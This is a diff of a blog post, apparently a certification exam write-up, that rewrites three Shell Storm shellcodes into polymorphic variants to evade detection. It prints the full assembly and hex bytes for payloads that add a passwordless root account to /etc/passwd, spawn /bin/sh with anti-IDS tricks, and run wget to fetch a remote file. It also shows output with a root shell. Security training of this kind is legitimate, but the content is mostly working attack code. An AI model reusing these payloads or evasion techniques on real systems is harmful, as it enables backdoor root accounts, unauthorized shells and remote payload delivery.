@@ -17,8 +17,8 @@ tags:
 ## Introduction
 This is the sixth post of the SLAE exam assignments serie.  
 
-The goal of this assignement is to create polymorphic versions of three shellcodes from [Shell Storm](http://shell-storm.org/shellcode/)
-These versions cannot be larger than 150% of the original shellcode and we get bonus points to make them shorter.
+The goal of this assignement is to create polymorphic versions of three shellcodes from [Shell Storm](http://shell-storm.org/shellcode/)  
+These versions cannot be larger than 150% of the original shellcode and we get bonus points to make them shorter.  
 In the context of this assignment, polymorphic means that we need to re-write these shellcodes using different instructions that does the same things as the original.
 
 All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-06-Polymorphic_shellcodes)
@@ -27,13 +27,13 @@ All the source code for this assignment can be found on my [github repository](h
 
 The payloads I've chosen this time are :
 
-	- [add root user (r00t) with no password to /etc/passwd by Kris Katterjohn](http://shell-storm.org/shellcode/files/shellcode-211.php)
-	- [execve /bin/sh anti-ids 40 bytes by NicatiN](http://shell-storm.org/shellcode/files/shellcode-256.php)
-	- [Remote file Download - 42 bytes by Jonathan Salwan](http://shell-storm.org/shellcode/files/shellcode-611.php)
+ - [add root user (r00t) with no password to /etc/passwd by Kris Katterjohn](http://shell-storm.org/shellcode/files/shellcode-211.php)
+ - [execve /bin/sh anti-ids 40 bytes by NicatiN](http://shell-storm.org/shellcode/files/shellcode-256.php)
+ - [Remote file Download - 42 bytes by Jonathan Salwan](http://shell-storm.org/shellcode/files/shellcode-611.php)
 
 ## Add root user without password
 
-The original code is as follow (gdb dump) :
+The original code is as follow (gdb dump) :  
 **Size : 69 bytes**
 ```nasm
    ; man 2 open
@@ -73,7 +73,7 @@ The original code is as follow (gdb dump) :
    0x00404083 <+67>:	int    0x80        ; exit
 ```
 
-Polymorphic version :
+Polymorphic version :  
 **Size : 69 bytes**
 ```nasm
     xor     ebx, ebx
@@ -109,15 +109,11 @@ Polymorphic version :
     int     0x80
 ```
 
-Original shellcode :
-"\x6a\x05\x58\x31\xc9\x51**\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63**\x89\xe3\x66"
-"\xb9\x01\x04**\xcd\x80**\x89\xc3\x6a\x04\x58\x31\xd2\x52**\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68**"
-"**\x72\x30\x30\x74**\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a\x06\x58**\xcd\x80**\x6a\x01\x58**\xcd\x80**";
+Original shellcode :  
+"\x6a\x05\x58\x31\xc9\x51***\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63***\x89\xe3\x66\xb9\x01\x04***\xcd\x80***\x89\xc3\x6a\x04\x58\x31\xd2\x52***\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74***\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a\x06\x58***\xcd\x80***\x6a\x01\x58***\xcd\x80***" 
 
-The new shellcode :
-"\x31\xdb\xf7\xe3\xb0\x05\x53**\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63**\x87\xd9"
-"\x8d\x1c\x24\xb5\x04\x41**\xcd\x80**\x93\x89\xd0\x50\x86\xc5**\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a**"
-"**\x68\x72\x30\x30\x74**\x8d\x0c\x24\xb2\x0c\xcd\x80\xd1\xe8**\xcd\x80**\x86\xc6\x40**\xcd\x80**"
+The new shellcode :  
+"\x31\xdb\xf7\xe3\xb0\x05\x53***\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63***\x87\xd9\x8d\x1c\x24\xb5\x04\x41***\xcd\x80***\x93\x89\xd0\x50\x86\xc5***\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74***\x8d\x0c\x24\xb2\x0c\xcd\x80\xd1\xe8***\xcd\x80***\x86\xc6\x40***\xcd\x80***"  
 
 We retrieve only the two strings and the three interrupt 80 instructions.
 
@@ -134,7 +130,7 @@ r00t::0:0:::root@kali:~#
 
 ## execve /bin/sh anti-ids
 
-The original code is as follow (gdb dump) :
+The original code is as follow (gdb dump) :  
 **Size : 40 bytes**
 ```nasm
 => 0x00404040 <+0>:	cdq    			; set EDX to 0
@@ -161,7 +157,7 @@ The original code is as follow (gdb dump) :
 
 ```
 
-Polymorphic version :
+Polymorphic version :  
 **Size : 37 bytes**
 ```nasm
     xor    edi, edi
@@ -200,7 +196,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## Remote file Download 
 
-The original code is as follow (gdb dump) :
+The original code is as follow (gdb dump) :  
 **Size : 42 bytes**
 ```nasm
 => 0x00404040 <+0>:	push   0xb	   ;
@@ -226,7 +222,7 @@ The original code is as follow (gdb dump) :
    0x00404068 <+40>:	int    0x80        ; exit()
 ```
 
-Polymorphic version :
+Polymorphic version :  
 **Size : 62 bytes (147.6%)**
 ```nasm
     xor     eax, eax
@@ -255,15 +251,13 @@ Polymorphic version :
     int     0x80		; exec execve("/usr/bin/wget", ["/usr/bin/wget","aaaa"],null)
 ```
 
-Original shellcode :
-"\x6a\x0b\x58\x99\x52**\x68\x61\x61\x61\x61**\x89\xe1\x52\x6a\x74"\x68\x2f\x77\x67\x65"
-"\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x40**\xcd\x80**"
+Original shellcode :  
+"\x6a\x0b\x58\x99\x52***\x68\x61\x61\x61\x61***\x89\xe1\x52\x6a\x74"\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x40***\xcd\x80***"  
 
-"\x31\xc0\xf7\xe0\x50\xb0\x0b**\x68\x61\x61\x61\x61**\x8d\x0c\x24\x6a\x74\xbb\x5e\xee\xce\xca\xd1\xeb"
-"\x53\xbb\x5e\xc4\xd2\xdc\xd1\xeb\x53\xbb\x5e\xea\xe6\xe4\xd1\xeb\x53\x8d\x1c\x24\x89\x54\x24\xfc"
-"\x89\x4c\x24\xf8\x89\x5c\x24\xf4\x8d\x4c\x24\xf4**\xcd\x80**"
+The new shellcode :  
+"\x31\xc0\xf7\xe0\x50\xb0\x0b***\x68\x61\x61\x61\x61***\x8d\x0c\x24\x6a\x74\xbb\x5e\xee\xce\xca\xd1\xeb\x53\xbb\x5e\xc4\xd2\xdc\xd1\xeb\x53\xbb\x5e\xea\xe6\xe4\xd1\xeb\x53\x8d\x1c\x24\x89\x54\x24\xfc\x89\x4c\x24\xf8\x89\x5c\x24\xf4\x8d\x4c\x24\xf4***\xcd\x80***"  
 
-I did not replace the 'aaaa' string because when used in real life we will set a valid url in place of it.
+I did not replace the 'aaaa' string because when used in real life we will set a valid url in place of it.  
 Except it there is only the int 0x80 at the end that we can find.
 
 ```plaintext
